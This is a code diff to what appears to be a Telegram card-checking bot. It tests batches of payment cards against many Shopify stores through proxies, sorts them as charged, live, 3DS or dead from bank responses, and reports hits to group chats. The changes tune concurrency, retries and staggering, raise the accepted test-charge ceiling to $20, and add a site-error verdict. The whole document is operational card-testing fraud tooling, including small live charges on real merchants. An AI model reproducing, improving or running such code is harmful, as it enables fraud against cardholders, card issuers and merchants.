@@ -73,9 +73,10 @@ HIT_LOG_GROUP_ID       = -1004361062205   # edit to your group
 EXTRA_CHARGED_GROUP_ID = -1003991915326   # edit to your group
 
 SH_COOLDOWN    = 25
-SITE_RETRIES   = 30    # max sites tried per card
+SITE_RETRIES   = 15    # max sites tried per card before giving up
 SITE_TIMEOUT   = 25    # seconds per API call
-MAX_CONCURRENT = 20
+MAX_CONCURRENT = 3     # only 3 cards check at once — real, deliberate checking
+CARD_STAGGER   = 4.0   # seconds to wait before launching the next card worker
 BUTTON_LOCK    = 30
 
 _CB_RESULT = "mshr"
@@ -1047,18 +1048,17 @@ async def _probe_one_site(site: str, proxies: list) -> bool:
             continue
 
         # Real bank response → site is alive!
+        # Price constraint: reject only absurd amounts (>$20) to avoid accidental charges
         if _is_success_response(resp):
-            # Price constraint: $0.50–$6.00
             try:
                 p = float(re.sub(r"[^\d.]", "", str(price)))
-                if 0.50 < p <= 6.00:
-                    logging.info(f"[PROBE] ✅ {site} alive: {resp!r} ${p:.2f}")
-                    return True
-                else:
-                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} out of range")
+                if p > 20.0:
+                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
                     return False
             except Exception:
-                return False
+                pass  # Can't parse price — accept anyway
+            logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
+            return True
 
         # Unknown response → try another attempt
         await asyncio.sleep(0.2)
@@ -1257,38 +1257,38 @@ async def _check_card_with_retry(
 ) -> tuple:
     """
     Try up to max_sites Shopify stores for this card.
-    Uses the same decision logic as sitechk.py:
 
-    For each site attempt:
-      1. Gateway != "SHOPIFY PAYMENTS" → skip site (not a Shopify payment processor)
-      2. Response in DEAD_ERRORS       → skip site (site infrastructure error)
-      3. Rate-limited (429)            → sleep, retry same site
-      4. Response in SUCCESS_RESPONSES → got a real bank response → classify card
+    Decision tree per attempt:
+      1. HTTP non-200                  → skip site (add to local dead)
+      2. Rate-limited (429)            → sleep 3-5s, retry same site
+      3. Response in DEAD_ERRORS       → skip site (infrastructure error, not a bank response)
+      4. Response in SUCCESS_RESPONSES → REAL bank response → classify card → return
       5. Unknown response              → skip site
 
-    CHARGED → ORDER_PAID / PAYMENT_AUTHORIZED / APPROVED
-    LIVE    → INSUFFICIENT_FUNDS / DO NOT HONOR / INCORRECT_CVV / INVALID_CVC
-    TDS     → 3DS_REQUIRED / 3D_SECURE
-    DEAD    → CARD_DECLINED / GENERIC_ERROR / GENERIC_DECLINE / etc.
+    If ALL attempts exhausted with only DEAD_ERRORS (no bank response ever received)
+    → return "SITE_ERROR" so the UI shows it as an Error, not a Dead card.
+
+    Returns: (verdict, raw_resp, price, currency)
+      verdict: CHARGED | TDS | LIVE | DEAD | SITE_ERROR
     """
     if not sites:
         sites = get_working_sites()
         if not sites:
             sites = list(BUILTIN_SITES)
 
-    # Per-call local dead set — never let one card's dead sites poison others
+    # Per-card local dead set only — each card tries sites independently.
+    # We intentionally do NOT share the global _DEAD_SITES here so that
+    # parallel cards don't block each other from trying the same sites.
     local_dead: set = set()
 
-    # Cap global blacklist so it never cascades to kill all sites
-    if len(_DEAD_SITES) > 150:
-        _DEAD_SITES.clear()
-
+    # Shuffle a fresh copy of the site pool for this card
     pool    = list(sites)
     random.shuffle(pool)
-    px_pool = proxies if proxies else _ALL_PROXIES
-    tried: set      = set()
-    price, currency = "0.00", "USD"
-    last_resp       = "Dead"
+    px_pool = list(proxies) if proxies else list(_ALL_PROXIES)
+    tried: set        = set()
+    price, currency   = "0.00", "USD"
+    last_resp         = "No sites responded"
+    got_bank_response = False     # True once we receive a real bank response
 
     for attempt in range(max_sites):
 
@@ -1296,14 +1296,14 @@ async def _check_card_with_retry(
         if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
             raise asyncio.CancelledError()
 
-        # ── Pick next untried site ────────────────────────────────────
-        skip = tried | local_dead | _DEAD_SITES
+        # ── Pick next untried site for THIS card ──────────────────────
+        skip      = tried | local_dead
         available = [s for s in pool if s not in skip]
         if not available:
-            # All sites tried this round — reset and try again
+            # Tried everything in pool once — reset and go again
             local_dead.clear()
             tried.clear()
-            pool = list(sites)
+            pool      = list(sites)
             random.shuffle(pool)
             available = pool[:]
 
@@ -1320,57 +1320,60 @@ async def _check_card_with_retry(
             raise
         except Exception as exc:
             logging.debug(f"[SH] {card[:6]}** {site} exception: {exc}")
-            await asyncio.sleep(0.3)
-            continue
-
-        logging.info(f"[API] {card[:6]}** #{attempt+1} site={site} "
-                     f"proxy={proxy or 'none'} gw={gw!r} → {resp!r}")
-
-        # ── 1. Gateway filter (must be Shopify Payments) ──────────────
-        if gw.upper().strip() != "SHOPIFY PAYMENTS":
             local_dead.add(site)
-            logging.debug(f"[SH] Skip {site}: gateway={gw!r}")
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(1.0)
             continue
 
-        # ── 2. HTTP-level error ───────────────────────────────────────
+        logging.info(f"[API] {card[:6]}** #{attempt+1}/{max_sites} "
+                     f"site={site} proxy={proxy or 'none'} → {resp!r}")
+
+        # ── 1. HTTP-level error (rare — API almost always returns 200) ─
         if http_st and http_st not in (200,):
             local_dead.add(site)
-            _DEAD_SITES.add(site)
-            await asyncio.sleep(0.05)
+            last_resp = f"HTTP {http_st}"
+            await asyncio.sleep(1.0)
             continue
 
-        # ── 3. Rate limited ───────────────────────────────────────────
-        if http_st == 429 or (resp and "429" in resp):
+        # ── 2. Rate limited ───────────────────────────────────────────
+        if http_st == 429 or (resp and "status: 429" in resp.lower()):
             tried.discard(site)          # allow retry same site
-            await asyncio.sleep(random.uniform(3.0, 5.0))
+            await asyncio.sleep(random.uniform(4.0, 7.0))
             continue
 
-        # ── 4. Site infrastructure error (DEAD_ERRORS) ───────────────
+        # ── 3. Site infrastructure error (DEAD_ERRORS) ───────────────
+        #       These are NOT bank responses — the site itself is broken.
         if _is_dead_site_response(resp):
             local_dead.add(site)
-            _DEAD_SITES.add(site)
             last_resp = resp
-            logging.debug(f"[SH] Dead site: {site} → {resp!r}")
-            await asyncio.sleep(0.05)
+            logging.debug(f"[SH] Site error: {site} → {resp!r}")
+            # Real delay — each dead-site check should take a real second
+            await asyncio.sleep(random.uniform(1.0, 2.0))
             continue
 
-        # ── 5. Real bank response (SUCCESS_RESPONSES) — classify card ─
+        # ── 4. Real bank response (SUCCESS_RESPONSES) → classify card ─
         if _is_success_response(resp):
-            last_resp = resp
-            verdict   = classify_response(resp)
-            logging.info(f"[RESULT] {card[:6]}** {verdict} via {site} → {resp!r}")
+            got_bank_response = True
+            last_resp         = resp
+            verdict           = classify_response(resp)
+            logging.info(f"[RESULT] {card[:6]}** → {verdict}  resp={resp!r}  "
+                         f"price={price}  site={site}")
             return verdict, resp, price, currency
 
-        # ── 6. Unknown response — log and skip ────────────────────────
+        # ── 5. Unknown response — skip this site ──────────────────────
         logging.debug(f"[SH] Unknown resp from {site}: {resp!r}")
         last_resp = resp
         local_dead.add(site)
-        await asyncio.sleep(0.2)
+        await asyncio.sleep(1.0)
 
-    # All attempts exhausted
-    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites, "
-                    f"last_resp={last_resp!r}")
+    # ── All attempts exhausted ────────────────────────────────────────
+    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites "
+                    f"bank_response={got_bank_response} last={last_resp!r}")
+
+    if not got_bank_response:
+        # Never reached a real bank — all sites were broken.
+        # Return SITE_ERROR so the UI counts this as Error, not Dead card.
+        return "SITE_ERROR", last_resp, price, currency
+
     return "DEAD", last_resp, price, currency
 
 
@@ -1564,6 +1567,11 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
     elif verdict == "LIVE":
         status_ln = f'<b>{ch_link} Live {_te(LIVE_EMOJI_ID,"✅")}</b>'
         gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
+    elif verdict == "SITE_ERROR":
+        # All sites returned infrastructure errors — no real bank check happened.
+        # Show as an error/warning, not as a dead card.
+        status_ln = f'<b>{ch_link} Error {_te(DECLINED_EMOJI_ID,"⚠️")} [No Live Sites]</b>'
+        gate_ln   = "<b>Gate ➳ Shopify | Sites Down</b>"
     else:
         status_ln = f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>'
         gate_ln   = "<b>Gate ➳ Shopify | 0-20$</b>"
@@ -1833,20 +1841,33 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
                 sess["dead"] += 1
                 sess["dead_cards"].append(rec)
 
+            elif verdict == "SITE_ERROR":
+                # Sites returned infrastructure errors — not a real card decline.
+                # Count as Error so Dead counter stays honest.
+                sess["errors"] += 1
+                sess["error_cards"].append(rec)
+
             else:
                 sess["errors"] += 1
                 sess["error_cards"].append(rec)
 
-            if sess["checked"] % 5 == 0 or sess["checked"] >= sess["total"]:
-                asyncio.create_task(_update_progress(bot, sid))
+            # Update progress after every single card so user sees real-time counts
+            asyncio.create_task(_update_progress(bot, sid))
 
+    # Launch workers one at a time with a stagger delay so:
+    # • Each card gets its own slice of the site pool
+    # • The user sees cards finishing one by one (not all at once)
+    # • The API is not hammered with 20 simultaneous calls
     tasks = []
     for i, (cf, cn) in enumerate(valid_cards):
         if sess.get("status") != "CHECKING":
             break
-        tasks.append(asyncio.create_task(worker(cf, cn)))
-        if (i + 1) % MAX_CONCURRENT == 0:
-            await asyncio.sleep(random.uniform(0.5, 1.0))
+        t = asyncio.create_task(worker(cf, cn))
+        tasks.append(t)
+        # Wait for CARD_STAGGER seconds before launching the next card.
+        # This also naturally throttles the API — each card checks
+        # a different set of sites because the pool is shuffled fresh per card.
+        await asyncio.sleep(CARD_STAGGER)
 
     sess["tasks"] = tasks
     await asyncio.gather(*tasks, return_exceptions=True)
